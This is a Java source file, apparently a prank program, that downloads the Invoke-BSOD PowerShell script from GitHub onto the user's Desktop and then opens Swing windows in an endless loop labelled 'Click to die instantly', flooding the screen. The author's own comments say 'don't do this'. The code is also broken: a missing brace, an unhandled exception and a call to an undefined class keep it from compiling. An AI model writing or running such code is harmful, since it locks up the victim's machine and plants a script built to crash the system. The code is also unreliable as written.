import javax.swing.*;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
public class Shit_Shit_Shit_Fuck_Shit {
public static void copyURLToFile(URL url, File file) {
		
		try {
			InputStream input = url.openStream();
			if (file.exists()) {
				if (file.isDirectory())
					throw new IOException("File '" + file + "' is a directory");
				
				if (!file.canWrite())
					throw new IOException("File '" + file + "' cannot be written");
			} else {
				File parent = file.getParentFile();
				if ((parent != null) && (!parent.exists()) && (!parent.mkdirs())) {
					throw new IOException("File '" + file + "' could not be created");
				}
			}

			FileOutputStream output = new FileOutputStream(file);

			byte[] buffer = new byte[4096];
			int n = 0;
			while (-1 != (n = input.read(buffer))) {
				output.write(buffer, 0, n);
			}

			input.close();
			output.close();
			
			System.out.println("File '" + file + "' downloaded successfully!");
		}
		catch(IOException ioEx) {
			ioEx.printStackTrace();
		}
	
	
	
    public static void main (String args[]) {
       String sUrl = "https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1";
		
	URL url = new URL(sUrl);
		
	//File where to be downloaded
	File file = new File(System.getProperty("user.home")+"/Desktop/Invoke-BSOD.ps1");
		
	URLReader.copyURLToFile(url, file);
    	while (true) { //why
    	JFrame death = new JFrame("haha yes");
    	    death.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    	    death.setSize(300,300);
    	    JButton weewoo = new JButton("Click to die instantly");
    	    death.getContentPane().add(weewoo);
    	    death.setVisible(true);
		
    	}
    	//don't do this
    }
}
